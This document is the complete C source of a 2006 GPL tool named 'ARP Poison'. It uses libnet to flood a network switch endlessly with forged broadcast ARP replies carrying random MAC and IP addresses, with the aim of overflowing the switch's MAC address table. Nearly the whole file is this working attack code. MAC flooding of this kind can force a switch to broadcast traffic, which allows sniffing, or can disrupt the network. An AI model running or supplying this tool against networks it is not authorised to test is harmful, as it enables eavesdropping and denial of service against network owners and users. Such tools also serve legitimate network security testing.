/*
   ARP Poison - Poison switches MAC address tables
   Copyright (C) 2006 Krzysztof Burghardt.

   $Id: arppoison.c,v 1.1 2006-03-08 00:10:42 kb Exp $

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/

#define _GNU_SOURCE
/* standard headers */
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
/* extern int errno */
#include <errno.h>
/* waitpid() */
#include <sys/wait.h>
/* strerror() */
#include <string.h>
/* libpcap */
#include <pcap.h>
/* libnet */
#include <libnet.h>
/* timne() */
#include <time.h>

#define MSIZE 6

void pcap_die (pcap_t *pcap_handle, char *message) {
    fprintf(stderr, "%s: %s\n", message, pcap_geterr(pcap_handle));
    pcap_close(pcap_handle);
    exit(EXIT_FAILURE);
}

void libnet_die (libnet_t *libnet_handle) {
    fprintf(stderr, "%s", libnet_geterror(libnet_handle));
    libnet_destroy(libnet_handle);
    exit(EXIT_FAILURE);
}

char *hw_ntoa(struct libnet_ether_addr *hw) {
    static int i;
    char *str;

    if ((str = malloc(6*2+5+1)) == NULL) {
	fprintf(stderr, "%s\n", strerror(errno));
	exit(EXIT_FAILURE);
    }
    str[0] = '\0';

    for (i = 0; i < 6; ++i) {
	sprintf(str, "%s%2.2X:", str, hw->ether_addr_octet[i]);
    }
    str[6*2+5] = '\0';

    return str;
}

int main (int argc, char **argv) {
    char *interface = NULL;
    libnet_t *libnet_handle = NULL;
    char pcap_error_buffer[PCAP_ERRBUF_SIZE];
    char libnet_error_buffer[LIBNET_ERRBUF_SIZE];
    struct libnet_ether_addr *hw_src = NULL;
    struct libnet_ether_addr *hw_dst = NULL;
    struct in_addr ip_src, ip_dst;
    u_int8_t *packet = NULL;
    u_int32_t packet_size;
    int status;

    if (argc > 1)
	interface = argv[1];

    if (interface == NULL)
	interface = pcap_lookupdev(pcap_error_buffer);

    if (interface == NULL) {
	fprintf(stderr, "pcap_lookupdev: %s\n", pcap_error_buffer);
	exit(EXIT_FAILURE);
    }
    
    printf ("using inteface %s\n", interface);
    
    if ((libnet_handle = libnet_init(LIBNET_LINK_ADV, interface, libnet_error_buffer)) == NULL) {
	fprintf(stderr, "%s", libnet_error_buffer);
	exit(EXIT_FAILURE);
    }

    /* seed random number generator with an unique number */
    srand(getpid()*time(NULL));
    
    if ((hw_src = malloc(sizeof(struct libnet_ether_addr))) == NULL) {
	fprintf(stderr, "%s\n", strerror(errno));
	exit(EXIT_FAILURE);
    }

    if ((hw_dst = malloc(sizeof(struct libnet_ether_addr))) == NULL) {
	fprintf(stderr, "%s\n", strerror(errno));
	exit(EXIT_FAILURE);
    }

    memset((void *)&hw_dst->ether_addr_octet, 0xff, MSIZE);
    hw_src->ether_addr_octet[0] = 0x00;

    ip_dst.s_addr = 0;

    printf("flooding with arp packets with random hw / ip addresses\n");

    for (;;) {
    
	    ip_src.s_addr = rand();
	    
	    hw_src->ether_addr_octet[1] = (int) (80.0*rand()/(RAND_MAX+1.0));
	    hw_src->ether_addr_octet[2] = (int) (255.0*rand()/(RAND_MAX+1.0));
	    hw_src->ether_addr_octet[3] = (int) (255.0*rand()/(RAND_MAX+1.0));
	    hw_src->ether_addr_octet[4] = (int) (255.0*rand()/(RAND_MAX+1.0));
	    hw_src->ether_addr_octet[5] = (int) (255.0*rand()/(RAND_MAX+1.0));

	    if (libnet_build_arp(
		    ARPHRD_ETHER,			/* hardware addr */
        	    ETHERTYPE_IP,			/* protocol addr */
        	    ETHER_ADDR_LEN,			/* hardware addr size */
        	    4,					/* protocol addr size */
        	    ARPOP_REPLY,			/* operation type */
    		    hw_src->ether_addr_octet,		/* sender hardware addr */
        	    (u_int8_t *)&ip_src.s_addr,		/* sender protocol addr */
        	    hw_dst->ether_addr_octet,		/* target hardware addr */
        	    (u_int8_t *)&ip_dst.s_addr,		/* target protocol addr */
		    NULL,				/* payload */
        	    0,					/* payload size */
        	    libnet_handle,			/* libnet context */
        	    0) == -1)				/* libnet id */
		libnet_die(libnet_handle);

	    if (libnet_build_ethernet(
		    hw_dst->ether_addr_octet,		/* dest eth addr */
		    hw_src->ether_addr_octet,		/* src eth addr */
		    ETHERTYPE_ARP,			/* protocol type */
		    NULL,				/* payload */
		    0,					/* payload size */
		    libnet_handle,			/* libnet context */
		    0) == -1)				/* libnet id */
		libnet_die(libnet_handle);

	    if (libnet_adv_cull_packet(libnet_handle, &packet, &packet_size) == -1)
		libnet_die(libnet_handle);

	    libnet_adv_free_packet(libnet_handle, packet);


	    if ((status = libnet_write(libnet_handle)) == -1)
	        printf("!");
	    else
	        printf(".");

	    usleep(100);

	    libnet_clear_packet(libnet_handle);

    }

    libnet_destroy(libnet_handle);

    return EXIT_SUCCESS;
}

// EoF
